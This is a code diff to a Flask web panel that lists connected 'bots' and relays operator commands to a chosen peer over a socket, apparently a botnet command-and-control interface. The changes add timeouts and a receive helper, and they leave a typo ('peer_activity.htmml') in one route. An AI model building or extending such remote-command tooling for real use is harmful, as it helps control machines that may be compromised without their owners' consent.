@@ -5,6 +5,7 @@ from socket import error
 import socket
 import os
 import sys
+import connection
 
 app = Flask(__name__)
 connection_err = 'Failed to connect to the server'
@@ -58,21 +59,23 @@ def main_activity():
     if request.method == 'GET':
         if not session.get('logged_in'):
             return redirect(url_for('home'))
-        else: 
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            ip = session.get('ip')
-            port = session.get('port')
-            sock.connect((ip, port))
-            sock.send("*".encode('utf-8'))
-            data_b = sock.recv(4096)
-            sock.close()
-            data = data_b.decode('utf-8')
-            ip_data = data.split('*')
-            session['cnt_peers'] = len(ip_data)
-            print('[DEBUG] Bots connected %s' %str(ip_data), file=sys.stdout)
-            #print('[DEBUG] Status [%d]' %(session['cnt_peers']))
-            return render_template('main_activity.html', ip_list = ip_data)
-
+        else:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                ip = session.get('ip')
+                port = session.get('port')
+                sock.connect((ip, port))
+                sock.send("*".encode('utf-8'))
+                data_b = sock.recv(4096)
+                data = data_b.decode('utf-8')
+                ip_data = data.split('*')
+                session['cnt_peers'] = len(ip_data)
+                print('[DEBUG] Bots connected %s' %str(ip_data), file=sys.stdout)
+                return render_template('main_activity.html', ip_list = ip_data)
+            except socket.timeout as err:
+                return render_template('main_activity.html')
+        
 #User activity, get information from the bot you are connected#
 @app.route('/peer_activity/<ip>', methods=['GET','POST'])
 def peer_activity(ip):
@@ -86,23 +89,21 @@ def peer_activity(ip):
             server_port = session.get('port')
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((server_ip, server_port))
-            sock.settimeout(5)
+            sock.settimeout(10)
             srv_msg = "*".join(['CMD', host, cmd])
             sock.send(srv_msg.encode('utf-8'))
             print("[DEBUG] Message to server [%s] | PEER [%s]" %(srv_msg, host))
-            try:
-                resp = sock.recv(4096)
-            except socket.timeout as err:
-                return render_template('peer_activity.html', ip = ip)
+            resp = connection.recvTimeout(sock)
+            #return render_template('peer_activity.html', ip = ip)
             sock.close()
             #TODO Check  resp format
-            resp = resp.decode('utf-8')
-            resp = resp.replace('\n', '<br>')
-            print("[DEBUG] Response from Server: %s" %resp)
+            #resp = resp.decode('utf-8')
+            #fin_resp = resp.replace('\n', '<br>')
             if resp:
+                print("[DEBUG] Response from Server: %s" %resp)
                 return render_template('peer_activity.html', ip = ip, cmd_response = resp)
             else:
-                return redirect(url_for('peer_activity.html', ip = ip))
+                return render_template('peer_activity.htmml', ip = ip)
 
         elif request.form['submit'] == '<==':
             return redirect(url_for('main_activity'))
